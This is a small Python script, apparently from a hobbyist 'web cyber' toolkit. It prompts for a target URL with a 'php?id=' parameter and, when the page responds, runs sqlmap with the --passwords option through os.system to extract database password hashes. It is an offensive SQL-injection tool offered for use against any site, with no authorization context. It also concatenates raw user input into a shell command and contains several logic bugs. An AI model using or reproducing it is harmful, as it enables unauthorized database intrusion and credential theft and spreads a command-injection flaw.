import os
import requests
import pyfiglet
from colorama import Fore, init
import platform as pf
init()


sysinfo = pf.uname()[0]

if sysinfo == 'Linux':
    os.system('clear')

banner = pyfiglet.figlet_format('SQL INJECTION')
print(banner)

domin_sql = input(Fore.YELLOW+'\n Enter Domin Name+(php?id=) : ')

def Attacks():
    os.system('sqlmap -u '+domin_sql+' --passwords')

https = requests.get(domin_sql)

if https.status_code == 200:
    Attacks()
else:
    print(ValueError)
print(Fore.RED+'\n Not found ! \n')

backpage = input(' Exit The script ? (Y / N)').casefold()

if backpage == 'y':
    exit()
else:
    backpage == 'n'
    os.system('python3 webcyber.py')